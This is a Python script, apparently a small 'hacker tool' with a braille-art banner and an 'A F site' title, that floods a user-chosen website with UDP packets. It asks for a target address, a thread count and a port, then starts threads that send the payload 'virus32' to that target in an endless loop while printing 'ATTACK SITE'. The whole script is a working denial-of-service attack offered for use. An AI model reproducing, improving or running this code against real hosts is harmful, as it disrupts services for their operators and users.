import time
import socket
import sys
import _thread
from colorama import Fore as g
import pyfiglet
import os

print(g.RED)
print('''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡶⠛⠛⠉⠉⣉⣛⡲⢤⡀⢸⢧⡀⠀⣠⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠋⠁⢀⣠⠶⠒⢉⡩⠍⠉⣳⣿⣿⣟⣷⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⣀⡔⠋⠀⣠⠞⠉⠀⣠⠖⠋⢩⡟⢻⣿⠻⣝⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⡴⠋⠀⣠⠞⠁⠀⢀⡞⠁⠀⠀⣼⡇⠘⡏⢧⢻⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⢀⡾⠁⢠⠞⠁⣠⠂⣴⠏⠀⡀⠀⢀⣿⡇⠀⡇⠘⣾⢳⣼⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⣴⣿⠁⡴⠃⢀⡞⣡⡿⡏⠀⡼⠁⠀⣿⡿⠁⠀⡇⠀⣿⡈⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⡏⠀⣸⣽⣏⡾⠁⣰⣯⡟⠉⢹⠃⣸⠃⠀⣾⣽⡇⠀⠀⡇⠀⢸⡇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠄⢹⠁⢸⠃⢸⡟⠀⣼⣿⣷⣦⣄⣿⣸⠇⠀⣸⣿⠋⣿⡀⠀⡇⠀⣿⣷⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡌⠀⢸⠀⡏⠀⡾⠃⣴⠋⠸⣿⣿⠟⣿⠏⢀⣷⡿⠃⠀⠸⣇⢠⡇⢰⣇⢿⣇⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠈⠀⢸⢰⠇⣷⠇⣰⡏⠀⠀⠀⠀⠀⡿⣠⠟⡿⢃⣤⣤⣤⣿⢸⢁⣿⢿⡈⢿⣯⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣀⣀⣀⡸⢾⢀⡟⢰⣿⡇⠀⠀⠀⠀⠀⠟⠁⠀⠁⠘⠿⠿⢛⣿⠇⣸⡇⢸⣷⣘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣾⣼⡇⣾⣿⣿⡀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣴⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣝⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⡙⣧⣀⣀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣦⣄⠀⠀⠀⠀⠀
⢠⣾⣿⣿⣿⣿⣿⠿⠋⠉⠉⠁⠀⠀⠈⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣻⡟⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⡇⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⣠⡴⠆⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠘⣆⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣷⣀⣦⣶⣿⣿⣶⣦⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠁⠀⠀⠀⠆⠹⣆⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⠢⠀⢸⣾⡀⢻⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠙⠓⠶⣬⣫⣧⠈⡇⠀⠀
⠀⢻⣿⣿⢳⣿⣿⣿⣿⣯⣷⣿⡿⠿⠛⠛⠛⠛⠛⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠈⢻⢤⡟⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠉⠉⠉⠉⠉⠛⠻⢿⣿⣿⣿⣿⣇⡉⠳⠲⣶⠶⢾⣾⡇⠀⠀
⠀⠸⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣆⠀⠈⢡⣴⡟⠃⠀⠀
⠀⠀⢹⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⡿⠟⣿⡇⠀⠀⠀
⠀⠀⢺⣿⣿⡇⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠟⠋⠀⢀⣽⡇⠀⠀⠀
⠀⠀⢿⣿⣿⣷⡀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢐⣼⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠟⠁⠀⠀⣠⢸⠁⡇⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣇⠀⠀⠀⠙⠲⠄⣀⣀⡀⠀⠀⠀⠀⢀⣵⠟⡟⠷⣄⠀⠀⠀⠀⠀⠀⠀⢀⣼⡟⠁⣶⠀⣴⣾⣏⡏⠀⡇⠀⠀⠀
⠀⠀⠀⠈⢿⣿⣿⣆⣄⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⢠⡿⠁⢠⡇⠀⠈⠳⣤⣤⣤⣠⣤⡴⣟⣽⠇⣸⢫⠾⣯⢟⡞⠀⢰⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣆⣀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⢸⠃⠀⠀⠀⠀⢀⣿⣿⣏⣼⣿⡿⢰⣿⠏⣼⣿⡿⠁⠀⣸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡿⠃⣿⠇⣸⠃⢸⣿⣾⠀⠀⠀⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠟⠁⠀⣿⣴⠇⢀⣿⢿⠇⠀⠀⢸⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡏⠀⠀⠀⢸⠏⠀⢸⡿⢸⡀⠀⠀⢸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢣⡀⠀⠀⢸⠀⠀⢸⡇⠀⠷⠀⠀⢸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢱⡀⠀⠸⣇⠀⠸⠇⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀⠙⢦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⢿⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢻⠷⣦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⣿⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣶⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢶⡀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⣴⡿⠁⢠⠛⣆⡃⠀⠀⠀⠀⠀⠀
⠀⣸⣇⠉⠓⠦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⡀⠀⢠⠟⠀⠀⠀⠀⠀⠀⣠⠞⣻⢃⡴⠋⠀⠘⢇⢠⡀⠀⠀⠀⠀
⣰⠇⠈⠑⣶⡤⣀⡉⠙⠒⠶⠤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣲⠏⠀⠀⠀⠀⠀⢠⡾⠁⢰⡿⢻⡀⠀⠀⠀⠘⣇⠙⢦⠀⠀⠀
⠇⠀⠀⢠⡟⠀⠈⠉⠛⣶⠤⢤⣄⡈⠉⠛⠒⠤⣤⣄⣀⠀⠀⠸⡏⠀⠀⠀⠀⠀⢠⡟⠁⠀⡿⠀⠈⠻⡄⠀⠀⠀⠘⣧⠀⠳⡄⠀
⠀⠀⠀⠟⠀⠀⠀⠀⠀⡇⠀⠀⠀⠈⠉⠳⠦⢤⣀⡀⠈⠛⢿⢀⣻⡀⠀⠀⠀⠠⢾⠤⠤⠀⡇⠀⠀⠀⠙⢦⠀⠀⠀⠈⠷⡄⠘⠆
⠀⠀⠀⠀''')
print(g.GREEN)
q=pyfiglet.figlet_format('                  A F    ')
q1=pyfiglet.figlet_format('                     s i t e')
print(q,q1)

print('\n')
site = input(" ENTER YOUR ADDRESS »»» ")
thread_count = input(" ENTER  THE NUMBER OF ATTACK »»» ")
ip = socket.gethostbyname(site)
UDP_PORT = int(input(' ENTER YOUR PORT »»» '))
MESSAGE = 'virus32'
print(g.CYAN)

print(g.GREEN)
time.sleep(3)
def ddos(i):
    while 1:
        time.sleep(1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(" (ATTACK SITE <3  :",site+')')
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
